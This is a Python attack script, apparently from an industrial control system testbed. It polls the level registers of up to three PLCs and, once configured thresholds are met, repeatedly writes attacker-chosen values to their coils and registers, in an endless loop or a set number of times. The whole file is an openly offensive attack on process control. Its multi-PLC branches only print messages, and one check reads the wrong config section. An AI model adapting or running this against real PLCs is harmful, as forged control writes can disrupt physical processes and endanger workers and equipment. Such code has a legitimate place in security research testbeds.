#!/usr/bin/env python3
from functools import partial
import configparser

def attack(ctx):  

    def on_level_change_plc1(value: int):

        # Read from config.ini
        config = configparser.ConfigParser()
        config.read('config.ini')
        plc = "plc1"
        
        pckt_number = config.get('params', 'packets_number')
        pckt_value = int(config.get('params', 'packets_value'))

        if(pckt_number == "loop"): 
            while(True):
                case = 0
                print('PLC 1 level value', value)
                
                if checkTrigger():
                    # Trigger checked
                    if(config.get('params', 'coil1_sup_limit') != ""):
                        case += 1
                    if(config.get('params', 'coil1_inf_limit') !=""):
                        case += 2

                    if(case == 0): # No limits
                        print("No limits!")   
                        
                    elif(case == 1): # Only sup limit
                        if(value >= int(config.get('params', 'coil1_sup_limit'))):
                            trigger_operation_plc(pckt_value, plc)
                        else:
                            print("Waiting for triggers...")
                            value +=1
                        
                    elif(case == 2): # Only inf limit
                        if(value <= int(config.get('params', 'coil1_inf_limit'))):
                            trigger_operation_plc(pckt_value, plc)
                        else:
                            print("Waiting for triggers...")
                            value -=1
                                                            
                    elif(case == 3): # Both limits
                        if(value < int(config.get('params', 'coil1_sup_limit')) and value > int(config.get('params', 'coil1_inf_limit'))):
                            trigger_operation_plc(pckt_value, plc)
                        else:
                            print("Waiting for triggers...")
                            if(value > int(config.get('params', 'coil1_sup_limit'))):
                                value -= 1
                            elif(value < int(config.get('params', 'coil1_inf_limit'))):
                                value +=1
                      
                else:
                    # Trigger unchecked - only main conditions
                    trigger_operation_plc(pckt_value, plc)

        else:
            # Pckt number != loop
            ct = 0
            n = int(pckt_number)
            while(ct < n):
                case = 0
                print('PLC 1 level value', value)
                
                if checkTrigger():
                    # Trigger checked
                    if(config.get('params', 'coil1_sup_limit') != ""):
                        case += 1
                    if(config.get('params', 'coil1_inf_limit') !=""):
                        case += 2

                    if(case == 0): # No limits
                        print("No limits!")   
                        
                    elif(case == 1): # Only sup limit
                        if(value >= int(config.get('params', 'coil1_sup_limit'))):
                            trigger_operation_plc(pckt_value, plc)
                        else:
                            print("Waiting for triggers...")
                            value +=1
                        
                    elif(case == 2): # Only inf limit
                        if(value <= int(config.get('params', 'coil1_inf_limit'))):
                            trigger_operation_plc(pckt_value, plc)
                        else:
                            print("Waiting for triggers...")
                            value -=1
                                                            
                    elif(case == 3): # Both limits
                        if(value < int(config.get('params', 'coil1_sup_limit')) and value > int(config.get('params', 'coil1_inf_limit'))):
                            trigger_operation_plc(pckt_value, plc)
                        else:
                            print("Waiting for triggers...")
                            if(value > int(config.get('params', 'coil1_sup_limit'))):
                                value -= 1
                            elif(value < int(config.get('params', 'coil1_inf_limit'))):
                                value +=1 
                else:
                    # Trigger unchecked - only main conditions
                    trigger_operation_plc(pckt_value, plc)
                ct = ct + 1
                
    def on_level_change_plc2(value:int):

        # Read from config.ini
        config = configparser.ConfigParser()
        config.read('config.ini')
        plc = "plc2"
        
        pckt_number = config.get('params', 'packets_number')
        pckt_value = int(config.get('params', 'packets_value'))

        if(pckt_number == "loop"): 
            while(True):
                case = 0
                print('PLC 2 level value', value)
                
                if checkTrigger():
                    # Trigger checked
                    if(config.get('params', 'coil2_sup_limit') != ""):
                        case += 1
                    if(config.get('params', 'coil2_inf_limit') !=""):
                        case += 2

                    if(case == 0): # No limits
                        print("No limits!")   
                        
                    elif(case == 1): # Only sup limit
                        if(value >= int(config.get('params', 'coil2_sup_limit'))):
                            trigger_operation_plc(pckt_value, plc)
                        else:
                            print("Waiting for triggers...")
                            value +=1
                        
                    elif(case == 2): # Only inf limit
                        if(value <= int(config.get('params', 'coil2_inf_limit'))):
                            trigger_operation_plc(pckt_value, plc)
                        else:
                            print("Waiting for triggers...")
                            value -=1
                                                            
                    elif(case == 3): # Both limits
                        if(value < int(config.get('params', 'coil2_sup_limit')) and value > int(config.get('params', 'coil2_inf_limit'))):
                            trigger_operation_plc(pckt_value, plc)
                        else:
                            print("Waiting for triggers...")
                            if(value > int(config.get('params', 'coil2_sup_limit'))):
                                value -= 1
                            elif(value < int(config.get('params', 'coil2_inf_limit'))):
                                value +=1
                    
                else:
                    # Trigger unchecked - only main conditions
                    trigger_operation_plc(pckt_value, plc)

        else:
            # Pckt number != loop
            ct = 0
            n = int(pckt_number)
            while(ct < n):
                case = 0
                print('PLC 2 level value', value)
                
                if checkTrigger():
                    # Trigger checked
                    if(config.get('params', 'coil2_sup_limit') != ""):
                        case += 1
                    if(config.get('params', 'coil2_inf_limit') !=""):
                        case += 2

                    if(case == 0): # No limits
                        print("No limits!")   
                        
                    elif(case == 1): # Only sup limit
                        if(value >= int(config.get('params', 'coil2_sup_limit'))):
                            trigger_operation_plc(pckt_value, plc)
                        else:
                            print("Waiting for triggers...")
                            value +=1
                        
                    elif(case == 2): # Only inf limit
                        if(value <= int(config.get('params', 'coil2_inf_limit'))):
                            trigger_operation_plc(pckt_value, plc)
                        else:
                            print("Waiting for triggers...")
                            value -=1
                                                            
                    elif(case == 3): # Both limits
                        if(value < int(config.get('params', 'coil2_sup_limit')) and value > int(config.get('params', 'coil2_inf_limit'))):
                            trigger_operation_plc(pckt_value, plc)
                        else:
                            print("Waiting for triggers...")
                            if(value > int(config.get('params', 'coil2_sup_limit'))):
                                value -= 1
                            elif(value < int(config.get('params', 'coil2_inf_limit'))):
                                value +=1
                    
                else:
                    # Trigger unchecked - only main conditions
                    trigger_operation_plc(pckt_value, plc)
                ct = ct + 1
                
                
    def on_level_change_plc3(value:int):

            # Read from config.ini
            config = configparser.ConfigParser()
            config.read('config.ini')
            plc = "plc3"
            
            pckt_number = config.get('params', 'packets_number')
            pckt_value = int(config.get('params', 'packets_value'))

            if(pckt_number == "loop"): 
                while(True):
                    case = 0
                    print('PLC 3 level value', value)
                    
                    if checkTrigger():
                        # Trigger checked
                        if(config.get('params', 'coil3_sup_limit') != ""):
                            case += 1
                        if(config.get('params', 'coil3_inf_limit') !=""):
                            case += 2

                        if(case == 0): # No limits
                            print("No limits!")   
                            
                        elif(case == 1): # Only sup limit
                            if(value >= int(config.get('params', 'coil3_sup_limit'))):
                                trigger_operation_plc(pckt_value, plc)
                            else:
                                print("Waiting for triggers...")
                                value +=1
                            
                        elif(case == 2): # Only inf limit
                            if(value <= int(config.get('params', 'coil3_inf_limit'))):
                                trigger_operation_plc(pckt_value, plc)
                            else:
                                print("Waiting for triggers...")
                                value -=1
                                                                
                        elif(case == 3): # Both limits
                            if(value < int(config.get('params', 'coil3_sup_limit')) and value > int(config.get('params', 'coil3_inf_limit'))):
                                trigger_operation_plc(pckt_value, plc)
                            else:
                                print("Waiting for triggers...")
                                if(value > int(config.get('params', 'coil3_sup_limit'))):
                                    value -= 1
                                elif(value < int(config.get('params', 'coil3_inf_limit'))):
                                    value +=1
                        
                    else:
                        # Trigger unchecked - only main conditions
                        trigger_operation_plc(pckt_value, plc)

            else:
                # Pckt number != loop
                ct = 0
                n = int(pckt_number)
                while(ct < n):
                    case = 0
                    print('PLC 3 level value', value)
                    
                    if checkTrigger():
                        # Trigger checked
                        if(config.get('params', 'coil3_sup_limit') != ""):
                            case += 1
                        if(config.get('params', 'coil3_inf_limit') !=""):
                            case += 2

                        if(case == 0): # No limits
                            print("No limits!")   
                            
                        elif(case == 1): # Only sup limit
                            if(value >= int(config.get('params', 'coil3_sup_limit'))):
                                trigger_operation_plc(pckt_value, plc)
                            else:
                                print("Waiting for triggers...")
                                value +=1
                            
                        elif(case == 2): # Only inf limit
                            if(value <= int(config.get('params', 'coil3_inf_limit'))):
                                trigger_operation_plc(pckt_value, plc)
                            else:
                                print("Waiting for triggers...")
                                value -=1
                                                                
                        elif(case == 3): # Both limits
                            if(value < int(config.get('params', 'coil3_sup_limit')) and value > int(config.get('params', 'coil3_inf_limit'))):
                                trigger_operation_plc(pckt_value, plc)
                            else:
                                print("Waiting for triggers...")
                                if(value > int(config.get('params', 'coil3_sup_limit'))):
                                    value -= 1
                                elif(value < int(config.get('params', 'coil3_inf_limit'))):
                                    value +=1
                        
                    else:
                        # Trigger unchecked - only main conditions
                        trigger_operation_plc(pckt_value, plc)
                    ct = ct + 1
    

    def checkTrigger():
        
        config = configparser.ConfigParser()
        config.read('config.ini')
        
        # Allocate trigger params (if present)
        coil_1_sup_limit = config.get('params', 'coil1_sup_limit')
        coil_1_inf_limit = config.get('params', 'coil1_inf_limit')
        coil_2_sup_limit = config.get('params', 'coil2_sup_limit')
        coil_2_inf_limit = config.get('params', 'coil2_inf_limit')
        coil_3_sup_limit = config.get('params', 'coil3_sup_limit')
        coil_3_inf_limit = config.get('params', 'coil3_inf_limit')

        if(coil_1_sup_limit == "" and coil_1_inf_limit == "" and coil_2_sup_limit == "" and coil_2_inf_limit == ""
            and coil_3_sup_limit =="" and coil_3_inf_limit == ""):
            return False # No triggers

        return True
    
    
    
    def trigger_operation_plc(p_val, plc):
        
        config = configparser.ConfigParser()
        config.read('config.ini')
        
        #print(f"{plc}")

        if(plc == "plc1"):
            plc_choice = config.get('params', 'plc1_choice')
        elif(plc == "plc2"):
            plc_choice = config.get('params', 'plc2_choice')
        else:
            plc_choice = config.get('params', 'plc3_choice')
            
        coil = []
        reg = []
        reg_d = []
        
        #print(plc_choice)
        
        
        # Extracting choices coils/registers
        choices_list = [choice.strip() for choice in plc_choice.split(',')]
        
        #print(choices_list)
        
        for choice in choices_list:
            if choice.startswith('c'):
                temp = ctx.register(plc, 'C', int(choice[-1]))
                temp.write(p_val)
            elif choice.startswith('r'):
                temp = ctx.register(plc, 'H', int(choice[-1]))
                temp.write(p_val)
            elif choice.startswith('m'):
                temp = ctx.register(plc, 'D', int(choice[-1]))
                temp.write(p_val)
                
            print(f"Writing on %QX0.{int(choice[-1])-1} - {plc}")
        
        #TODO register write          
        
        if p_val == 0:
            print('COMMAND OFF - Value wrote:', p_val)
        elif p_val == 1:
            print('COMMAND ON - Value wrote:', p_val)

    
    # Read from config.ini
    config = configparser.ConfigParser()
    config.read('config.ini')

    # Allocate all IW registers
    plc_1_input_register = ctx.register('plc1', 'I', 0)
    plc_2_input_register = ctx.register('plc2', 'I', 0)
    plc_3_input_register = ctx.register('plc3', 'I', 0)
       
    # PLC attack
    # ONE PLC selected
    if config.get('params', 'plc1_choice') != "" and config.get('params', 'plc2_choice')== "" and config.get('params', 'plc3_choice') == "":
        print("Attacking one plc...")
        if config.get('params', 'plc1_choice') != "":
            plc_1_input_register.start_polling(500, on_level_change_plc1)
        elif config.get('params', 'plc2_choice') != "":
            plc_2_input_register.start_polling(500, on_level_change_plc2)
        elif config.get('params', 'plc3_choice') != "":
            plc_3_input_register.start_polling(500, on_level_change_plc3)



    # TWO PLCs selected
    if config.get('plc', 'plc1') != "" and (config.get('params', 'plc2_choice') != "" or config.get('params', 'plc3_choice') != ""):
        print("Attacking two plcs...")

    # THREE PLCs selected 
    if config.get('plc', 'plc1') != "" and config.get('params', 'plc2_choice') != "" and config.get('params', 'plc3_choice') != "":
        print("Attacking three plcs...")



